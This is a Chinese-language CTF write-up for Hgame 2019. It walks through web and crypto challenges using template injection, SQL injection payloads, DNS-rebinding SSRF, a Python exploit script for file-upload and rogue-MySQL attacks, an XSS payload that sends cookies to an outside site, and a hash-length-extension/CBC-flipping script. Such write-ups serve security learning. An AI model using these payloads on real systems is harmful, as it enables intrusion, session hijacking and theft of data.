---
title: Hgame Writeup
date: 2019-03-09 00:45:02
tags: [hgame, writeup]
---

## happyPython

随便 fuzz 一下发现 404 页面有模板注入, http://118.25.18.223:3001/asd%7B%7Bconfig%7D%7D.  
拿到 `'SECRET_KEY': '9RxdzNwq7!nOoK3*'`, 把 session 里的 user_id 改成 `1` 就行了.
![](https://i.loli.net/2019/03/21/5c93a6120d105.png#center)
![](https://i.loli.net/2019/03/21/5c93a611dc09d.png#center)

<!--more-->

## happyPHP

`users` 页面有源码泄露, `https://github.com/Lou00/laravel`.  
审计源码发现 `SessionsController.php` 直接拼接 sql 语句, 存在注入.  

```php
class SessionsController extends Controller
{
    public function store(Request $request)
    {
        $credentials = $this->validate($request, [
            'email' => 'required|email|max:100',
            'password' => 'required'
        ]);
        if (Auth::attempt($credentials)) {
            if (Auth::user()->id ===1){
                session()->flash('info','flag :******');
                return redirect()->route('users.show');
            }
            $name = DB::select("SELECT name FROM `users` WHERE `name`='".Auth::user()->name."'");
            session()->flash('info', 'hello '.$name[0]->name);
            return redirect()->route('users.show');
        } else {
            session()->flash('danger', 'sorry,login failed');
            return redirect()->back()->withInput();
        }
    }
    public function destroy()
    {
        Auth::logout();
        session()->flash('success', 'logout success');
        return redirect('login');
    }
}
```

注册名称为 `123' union select password from users where id =1#`,  
就可以拿到管理员的加密过的密码  

![](https://i.loli.net/2019/03/21/5c93a611b6a32.png#center)  
![](https://i.loli.net/2019/03/21/5c93a63b613bd.png#center)  

同理  `123' union select email from users where id =1#`  
拿到 email `admin@hgame.com`  

config/app.php 可以找到加密方式 `'cipher' => 'AES-256-CBC'`,  
秘钥来自环境变量 `env('APP_KEY')`,  
查找 git 的记录, 发现被删掉的 `.env`  
`APP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=`,  
用这个来解密就可以了

```
php > echo openssl_decrypt("EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=",'AES-256-CBC',base64_decode('9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='),0,base64_decode('rnVrqfCvfJgnvSTi9z7KLw=='));
s:16:"9pqfPIer0Ir9UUfR";
```

登录后就是 flag~


## happyJava

这题有点坑 233, 提示放出来才做出来.  
提示: `spring-boot-actuator`  
查了一下, fuzz /monitor /actuator 等等都没有,  
随缘扫了一下端口找到 `9876` 端口开着 http, 竟然正是这个 spring-boot-actuator  
访问 `http://119.28.26.122:9876/mappings` 就可以拿到所有的路由  

![](https://i.loli.net/2019/03/21/5c93a6119f52e.png#center)

题目是这两个 `/you_will_never_find_this_interface`, `/secret_flag_here`,  
看了一下是 SSRF, 试了一会发现 DNS 请求会请求两次, 可以采用 DNS Rebinding,  
因为后面可以拿 Shell 下题目, 我就直接给大家看题目源码了  

```java
@GetMapping(path={"/you_will_never_find_this_interface"})
public String YouWillNeverFindThisInterface(@RequestParam(value="url", defaultValue="") String url)
{
    if (url.isEmpty()) {
        return "`url` cant be empty!";
    }
try
{
    URL u = new URL(url);
    
    String domain = u.getHost();
    String ip = InetAddress.getByName(domain).getHostAddress();
    if (ip.equals("127.0.0.1")) {
        return "Dont be evil. Dont request 127.0.0.1.";
    }
    URLConnection connection = u.openConnection();
    connection.setConnectTimeout(5000);
    connection.setReadTimeout(5000);
    BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String current;
    while ((current = in.readLine()) != null) {
        sb.append(current);
    }
    return sb.toString();
}
    catch (Exception e)
    {
        return "emmmmmmm, something went wrong: " + e.getMessage();
    }
}
```

注意 `String ip = InetAddress.getByName(domain).getHostAddress();` 和 `URLConnection connection = u.openConnection();`.   
在拿到 ip 以后, 是直接再用原来的链接打开, 而不是通过 ip 访问. 也就是说, 这里其实解析了两次域名 (如果没有缓存的话, 这个下面说)  
这给我们了机会来绕过检测, 我们只要让 DNS 第一次返回一个不是 127.0.0.1 的地址, 第二次再返回 127.0.0.1 即可. 这样 u.openConnection 将会链接 127.0.0.1, 实现 SSRF.   
可以直接在 Github 上找到已有的[项目](https://github.com/Crypt0s/FakeDns), 试了一下还是不错的. 不过在这个题目下使用有点小问题, 题目这里设置的 DNS 服务器是 8.8.8.8, 而 8.8.8.8 在递归的时候请求了一个不支持的类型 \x00\xff, 查了一下 RFC, 是这个  

```
3.2.3. QTYPE values
QTYPE fields appear in the question part of a query.  QTYPES are a
superset of TYPEs, hence all TYPEs are valid QTYPEs.  In addition, the
following QTYPEs are defined:
AXFR            252 A request for a transfer of an entire zone
MAILB           253 A request for mailbox-related records (MB, MG or MR)
MAILA           254 A request for mail agent RRs (Obsolete - see MX)
*               255 A request for all records
```

请求所有记录, 还好不是什么奇葩的, 我们稍微修改一下, 正常返回 A 记录即可.  

```diff
@@ -52,7 +53,8 @@ 
TYPE = {
     "\x00\x0c": "PTR",
     "\x00\x10": "TXT",
     "\x00\x0f": "MX",
-    "\x00\x06": "SOA"
+    "\x00\x06": "SOA",
+    "\x00\xff": "A"
 }
 
 # Stolen:
@@ -346,6 +348,7 @@ 
CASE = {
     "\x00\x0c": PTR,
     "\x00\x10": TXT,
     "\x00\x06": SOA,
+    "\x00\xff": A,
 }
 ```

然后设置 conf  

```
$ cat dns.conf
A .* 1.1.1.1,127.0.0.1
```

就可以啦, 这样第一次请求返回 `1.1.1.1`, 第二次 `127.0.0.1`, 绕过了检测.  
再说说缓存, 为了加快请求速度, 现在的操作系统都会将上次请求保存下来, 在一段时间内都会使用第一次请求的结果. 所以这种方式也有对应的局限. 我们可以看看题目的设置  

```java
@SpringBootApplication
public class HappyjavaApplication
{
  public static void main(String[] args)
  {
    Security.setProperty("networkaddress.cache.negative.ttl", "0");
    Security.setProperty("networkaddress.cache.ttl", "0");
    System.setProperty("sun.net.spi.nameservice.nameservers", "8.8.8.8");
    System.setProperty("sun.net.spi.nameservice.provider.1", "dns,sun");
    SpringApplication.run(HappyjavaApplication.class, args);
  }
}
```

是将 `networkaddress.cache.ttl` 设到了 0, 相当于关闭了缓存, 所以才能这么玩 233  

接下来访问 `/secret_flag_here`, 是个解析 json 的界面, 当时目测就是 fastjsonRCE, 挺久之前的洞了, 网上有很多文章, 这里就不多说了. 需要注意一下 URL 需要二次编码以及题目限制了 `TemplatesImpl` 的使用

```java
@GetMapping(path={"/secret_flag_here"})
public String SecretFlagHere(@RequestParam(value="data", defaultValue="") String data, HttpServletRequest request)
{
    String ip = request.getRemoteAddr();
    if (!ip.equals("127.0.0.1")) {
      return "This is danger interface, only allow request from 127.0.0.1!<br/>Your IP:" + ip;
    }
    if (data.equals("")) {
      return "data cant be empty!";
    }
    if ((data.contains("TemplatesImpl")) && (data.contains("@type"))) {
      return "Evil hacker?";
    }
    try
    {
      object = JSON.parse(data);
    }
    catch (Exception e)
    {
      Object object;
      return "Invalid JSON string!";
    }
    Object object;
    String result = "WoW! Convert JSON to object...OK!";
    result = result + "<br>Result: " + object.toString();
    
	return result;
}
```


## happyGo

继续代码审计 233  
题目说 flag 在 /flag, 而看了一圈并没有任意文件读取之类的.  
但是这里注意到 `model.go` 中的 `orm.RegisterDataBase("default", "mysql", fmt.Sprintf("%s:%s@tcp(%s:%s)/%s?allowAllFiles=true", username, password, host, port, database))`
中的 `allowAllFiles=true`, 这允许我们 `LOAD LOCAL FILE`, 这里就要谈到一种攻击方式,  大家可以看[这里](http://aq.mk/index.php/archives/23/)  
接下来就要想办法覆盖掉配置文件, 让服务端连接我们的恶意服务器  

第一个漏洞点在 `userinfo.go`,  
```go
c.SaveToFile("uploadname", "static/uploads/" + h.Filename)

o := orm.NewOrm()
u := models.Users{Id: uid.(int)}

err = o.Read(&u)
if err != nil {
    c.Abort("500")
}
u.Avatar = "/static/uploads/" + h.Filename
_, err = o.Update(&u)
if err != nil {
    c.Abort("500")
}

c.Redirect("/userinfo", http.StatusFound)
```

这里 Filename 没有过滤就直接拼接上去, 导致可以任意文件上传,  
将位置设到 session 保存的目录底下, 就可以伪造 session 拿到管理员权限. (不了解的同学可以去了解一下 gogs 的 RCE)  
PS. 这里直接覆盖 app.conf 没有用... 估计服务端的源码另外修改过  

而且管理员在删除用户时会直接删掉这个头像文件,  

```
if user.Avatar != "/static/img/avatar.jpg" {
    fmt.Println(user.Avatar)
    err := os.Remove(user.Avatar[1:])
    fmt.Println(err)
}
```

这里我的方法是再建一个用户, 将头像设成 app.conf 所在路径, 用管理员权限的 session 删掉这个用户, 这时配置文件将会被删除.  
再去访问 `/install`, 就可以把我们的配置文件写进去了.  

因为 5min 就重置一次, 我就写了个脚本  

```python
SERVER = "http://94.191.10.201:7000"
# http://94.191.10.201:7000
# http://127.0.0.1:9999

import requests
import string
import random
import bs4
import re


def register(username, password):
    sess = requests.session()
    sess.get(f"{SERVER}/auth")
    data = {
        "username": username,
        "password": password,
        "confirmpass": password,
    }
    sess.post(f"{SERVER}/auth/register", data=data)


def login(sess, username, password):
    sess.get(f"{SERVER}/auth")
    data = {
        "username": username,
        "password": password,
    }
    sess.post(f"{SERVER}/auth/login", data=data)


adminUsername = "".join(random.choices(string.ascii_letters, k=10))
adminPassword = "rmb1222"
adminSess = requests.session()
register(adminUsername, adminPassword)
login(adminSess, adminUsername, adminPassword)

sessPath = adminSess.cookies["PHPSESSID"]
newAvatar = f"../../tmp/{sessPath[0]}/{sessPath[1]}/{sessPath[0:3]}cb478171476a1dbcec5ffdef658c4"

file = {'uploadname': (newAvatar, open('test.png', 'rb'))}
adminSess.post(f"{SERVER}/userinfo", files=file) 

adminSess.cookies["PHPSESSID"] = f"{sessPath[0:3]}cb478171476a1dbcec5ffdef658c4"  # now you are admin
print(adminUsername)
print(newAvatar)

# ------------
dummyUsername = "".join(random.choices(string.ascii_letters, k=10))
dummyPassword = "rmb1222"
dummySess = requests.session()
register(dummyUsername, dummyPassword)
login(dummySess, dummyUsername, dummyPassword)

newAvatar = "../../conf/app.conf"
file = {'uploadname': (newAvatar, open('temp', 'rb'))}
dummySess.post(f"{SERVER}/userinfo", files=file)
print(dummyUsername)

# ------------
res = adminSess.get(f"{SERVER}/admin")
reg = fr"{dummyUsername} \(UID: ([0-9]{{0,}})\)"
uid = re.findall(reg, res.text)
print(uid)
uid = uid[0]
adminSess.get(f"{SERVER}/admin/user/del/{uid}") # delete app.conf
# ------------


# ------------ overwirte it
res = adminSess.get(f"{SERVER}/install")
print(res.text)
data = {
    "host": "your server ip",
    "port": "port",
    "username": "root",
    "password": "rmb122",
    "database": "123",
}
adminSess.post(f"{SERVER}/install", data=data)

register("123123123", "1231231231")
```

然后就守株待兔吧 233  
![](https://i.loli.net/2019/03/21/5c93a61185745.png#center)


## HappyXss

这个算是比较简单的了, 直接用 `<iframe src=javascript:alert('xss');></iframe>` 就可以绕了  
不过需要注意下 CSP, `Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src *`  
用 `<img src=''>` 的方式来拿 cookie 是不行了, 但是注意 `style-src *`,  
可以通过 css 来拿 cookie, payload 这样  

```javascript
(function(){ css=document.createElement("link");css.setAttribute("rel","stylesheet");css.setAttribute("href","yoursite?a="+escape(document.cookie));document.getElementsByTagName("head")[0].appendChild(css);}())
```


## easy_rsa

共模攻击, 不过这里 e1, e2 不互质, 3 == gcd(e1, e2), 我们先把 e1, e2 都除以 3  
然后把除以三以后的 e1, e2 丢到脚本里跑, 把结果开三次方就可以了


## Sign_in_SemiHard

哈希长度拓展 + CBC 字节翻转, 直接上脚本吧, 不多说了  
因为时间有限所以有很多地方实现的很暴力, 233

```python
import hashpumpy
import remoteCLI
import string
from binascii import hexlify, unhexlify

BLOCK_LENGTH = 16
ZEROS = bytearray([0 for i in range(16)])
regToken = r'Your token is: ([0-9A-Za-z]{0,})'
regUsername = r'Sorry, your username\(hex\) ([0-9A-Za-z]{0,}) is inconsistent with given signature\.'


def xor(a, b):
    result = bytearray()
    for i in range(len(a)):
        result.append(a[i] ^ b[i])
    return result


unprintable = b""
for i in range(256):
    if chr(i) not in string.printable:
        unprintable += bytes([i])

cli = remoteCLI.CLI()
cli.connect("47.95.212.185", 38611)
cli.sendLine("1")
cli.sendLine(hexlify(b'\x00\x00'))
token = cli.recvUntilFind(regToken)[0]
token = unhexlify(token)

sig = token[-BLOCK_LENGTH:]
res = hashpumpy.hashpump(hexlify(sig), '\x00\x00', 'admin', 16)
assert res[1].strip(unprintable) == b'admin'
print(res)

newSig = bytearray(unhexlify(res[0]))
newPt = bytearray(res[1])
newPt[-1] = ord('e')  # change last byte to e
offset = len(newPt) % BLOCK_LENGTH - 1

padLen = BLOCK_LENGTH - len(newPt) % BLOCK_LENGTH
newPt += bytearray([padLen]) * padLen
print(newPt)
assert len(newPt) // BLOCK_LENGTH == 4

b1st = bytearray()
b2nd = bytearray()
b3rd = bytearray()
b4th = bytearray()
midVal = bytearray()

cli.sendLine("1")
cli.sendLine(hexlify(newPt[-2 * BLOCK_LENGTH:]))  # encrypt last two block
token = cli.recvUntilFind(regToken)[0]
token = unhexlify(token)
token = bytearray(token)
iv = token[:BLOCK_LENGTH]
cipher = token[BLOCK_LENGTH:-2 * BLOCK_LENGTH]  # get the encrypted block and drop the padding
cipher[offset] ^= ord("e")  # flip the byte, admie -> admin
cipher[offset] ^= ord("n")
b4th = cipher[BLOCK_LENGTH:]  # the last block is the final block
b3rd = cipher[:BLOCK_LENGTH]

cli.sendLine("2")
cli.sendLine(hexlify(ZEROS + cipher + ZEROS))
token = cli.recvUntilFind(regUsername)[0]
token = bytearray(unhexlify(token))
assert b'admin' in token
midVal = token[:BLOCK_LENGTH]  # the mid val of 3rd block
b2nd = xor(midVal, newPt[-2 * BLOCK_LENGTH:-BLOCK_LENGTH])

cli.sendLine("2")  # decrypt 2nd to get mid val
cli.sendLine(hexlify(ZEROS + b2nd + b3rd + b4th + ZEROS))
token = cli.recvUntilFind(regUsername)[0]
token = unhexlify(token)
token = bytearray(token)
midVal = token[:BLOCK_LENGTH]  # get the mid val of 2nd block
b1nd = xor(midVal, newPt[-3 * BLOCK_LENGTH:-2 * BLOCK_LENGTH])

cli.sendLine("2")  # decrypt 1nd to get mid val
cli.sendLine(hexlify(ZEROS + b1nd + b2nd + b3rd + b4th + ZEROS))
token = cli.recvUntilFind(regUsername)[0]
token = unhexlify(token)
token = bytearray(token)
midVal = token[:BLOCK_LENGTH]  # get the mid val of 1nd block
iv = xor(midVal, newPt[-4 * BLOCK_LENGTH:-3 * BLOCK_LENGTH])

print(hexlify(iv + b1nd + b2nd + b3rd + b4th + newSig))
cli.sendLine("2")
cli.sendLine(hexlify(iv + b1nd + b2nd + b3rd + b4th + newSig))
cli.console()
```